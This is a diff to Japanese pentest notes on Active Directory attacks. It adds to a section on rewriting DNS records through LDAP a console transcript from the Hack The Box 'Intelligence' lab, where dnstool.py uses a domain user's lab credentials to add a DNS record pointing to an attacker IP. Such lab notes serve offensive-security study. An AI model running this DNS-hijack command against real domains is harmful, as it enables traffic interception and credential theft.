@@ -1,8 +1,3 @@
-# Description
-----
-
-
-
 # Attack
 ----
 ## Basics
@@ -153,5 +148,19 @@
 
 ## Rewrite DNS Record
 * ldapのエントリを書き換えることで、ldapを参照するDNSのエントリを書き換え可能
+
+* [krbrelayx/dnstool](https://github.com/dirkjanm/krbrelayx)を利用可能
+
 * HTB: Intelligence
+
+  ```console
+  ┌─[✗]─[rio@parrot]─[~/Htb/Intelligence]
+  └──╼ $dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'web.intelligence.htb' -d 10.10.14.40 10.129.183.87
+  [-] Connecting to host...
+  [-] Binding to host
+  [+] Bind OK
+  [-] Adding new record
+  [+] LDAP operation completed successfully
+  ```
+
 
